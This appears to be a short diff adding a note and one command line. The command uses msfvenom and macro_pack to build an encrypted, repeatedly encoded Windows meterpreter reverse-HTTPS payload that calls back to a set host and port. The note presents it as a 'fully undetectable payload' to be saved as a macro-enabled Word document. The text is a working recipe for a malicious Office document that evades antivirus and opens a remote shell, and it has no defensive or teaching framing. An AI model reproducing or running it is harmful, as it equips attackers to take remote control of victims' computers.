@@ -1,0 +1,5 @@
+to have a fully undetectable payload run this:
+
+#msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=192.168.1.7 LPORT=443 -f vba -e x86/shikata_ga_nai -i 15 --encrypt aes256 | python3 macro_pack.py -o -G myscript.vba
+
+and then save it as a macro enabled document on a word file
